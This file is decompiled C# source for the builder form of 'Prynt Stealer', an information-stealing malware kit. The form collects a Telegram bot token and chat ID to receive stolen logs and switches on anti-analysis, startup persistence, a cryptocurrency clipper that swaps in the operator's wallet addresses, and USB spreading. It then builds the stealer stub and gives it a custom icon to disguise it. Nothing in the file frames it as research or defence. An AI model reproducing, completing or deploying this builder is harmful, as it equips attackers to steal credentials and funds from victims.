using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Loader;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace PryntStealer
{
	// Token: 0x0200000E RID: 14
	public partial class Form1 : Form
	{
		// Token: 0x0600004F RID: 79 RVA: 0x00006764 File Offset: 0x00004964
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00006774 File Offset: 0x00004974
		private void button2_Click(object sender, EventArgs e)
		{
			if (this.token.Text.Length == 0 || this.chatid.Text.Length == 0 || this.password.Text.Trim().Length == 0 || this.password.Text == "Zip password")
			{
				MessageBox.Show("don t leave it empty");
				return;
			}
			if (this.password.Text == null)
			{
				MessageBox.Show("Password Section Can t be Empy");
				return;
			}
			bool flag = false;
			try
			{
				sendtg.sendText("\ud83d\udc63 Prynt Stealer Has Been Activated password for your logs is " + this.password.Text.Trim(), this.chatid.Text, this.token.Text);
				flag = true;
			}
			catch (Exception)
			{
				MessageBox.Show("Check your bot token and chat id");
			}
			if (flag)
			{
				MessageBox.Show("Bot Connected");
				build.ConfigValues["Telegram API"] = crypt.EncryptConfig(this.token.Text);
				build.ConfigValues["Telegram ID"] = crypt.EncryptConfig(this.chatid.Text);
				build.ConfigValues["password"] = this.password.Text.Trim();
				if (this.checkBox1.Checked)
				{
					build.ConfigValues["AntiAnalysis"] = "1";
				}
				if (this.checkBox2.Checked)
				{
					build.ConfigValues["Startup"] = "1";
					build.ConfigValues["Clipper"] = "1";
					build.ConfigValues["BTC"] = this.btc.Text;
					build.ConfigValues["Etherium"] = this.eth.Text;
					build.ConfigValues["LiteCoin"] = this.ltc.Text;
					build.ConfigValues["Monero"] = this.monero.Text;
				}
				if (this.checkBox3.Checked)
				{
					build.ConfigValues["USB"] = "1";
				}
				build.ConfigValues["Sleep"] = this.numericUpDown1.Value.ToString();
				string text = build.BuildStub();
				if (this.txtIcon.Text.Length == 0 || !File.Exists(this.txtIcon.Text))
				{
					MessageBox.Show("Stealer Saved in " + text);
					return;
				}
				MessageBox.Show("Stealer Saved in " + text);
				IconChanger.InjectIcon(text, this.txtIcon.Text);
			}
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00006A24 File Offset: 0x00004C24
		private void btnIconOpen_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00006A26 File Offset: 0x00004C26
		private void txtIcon_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00006A28 File Offset: 0x00004C28
		private void button1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icon (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.txtIcon.Text = openFileDialog.FileName;
					this.pictureIcon.ImageLocation = openFileDialog.FileName;
					this.pictureIcon.BorderStyle = BorderStyle.FixedSingle;
				}
				else
				{
					this.txtIcon.Text = string.Empty;
					this.pictureIcon.ImageLocation = string.Empty;
				}
			}
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00006ABC File Offset: 0x00004CBC
		private void txtIcon_TextChanged_1(object sender, EventArgs e)
		{
			if (string.IsNullOrWhiteSpace(this.txtIcon.Text))
			{
				this.txtIcon.Text = string.Empty;
				this.pictureIcon.ImageLocation = string.Empty;
				this.pictureIcon.BorderStyle = BorderStyle.None;
			}
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00006AFC File Offset: 0x00004CFC
		private void Form_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00006AFE File Offset: 0x00004CFE
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://t.me/officialpryntsoftware");
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00006B0B File Offset: 0x00004D0B
		private void label3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00006B0D File Offset: 0x00004D0D
		private void token_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00006B0F File Offset: 0x00004D0F
		private void bunifuPictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00006B11 File Offset: 0x00004D11
		private void bunifuButton1_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00006B18 File Offset: 0x00004D18
		private void btc_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00006B1A File Offset: 0x00004D1A
		private void eth_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00006B1C File Offset: 0x00004D1C
		private void label6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005E RID: 94 RVA: 0x00006B1E File Offset: 0x00004D1E
		private void label9_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00006B20 File Offset: 0x00004D20
		private void label8_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00006B22 File Offset: 0x00004D22
		private void numericUpDown1_ValueChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00006B24 File Offset: 0x00004D24
		private void numericUpDown1_ValueChanged_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00006B26 File Offset: 0x00004D26
		private void bunifuGradientPanel3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00006B28 File Offset: 0x00004D28
		private void bunifuTextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00006B2A File Offset: 0x00004D2A
		private void bunifuButton2_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00006B33 File Offset: 0x00004D33
		private void siticoneCircleButton1_Click(object sender, EventArgs e)
		{
			new Form2().ShowDialog();
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00006B40 File Offset: 0x00004D40
		private void bunifuGradientPanel2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00006B44 File Offset: 0x00004D44
		private void button1_Click_1(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icon (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.txtIcon.Text = openFileDialog.FileName;
					this.pictureIcon.ImageLocation = openFileDialog.FileName;
					this.pictureIcon.BorderStyle = BorderStyle.FixedSingle;
				}
				else
				{
					this.txtIcon.Text = string.Empty;
					this.pictureIcon.ImageLocation = string.Empty;
				}
			}
		}
	}
}
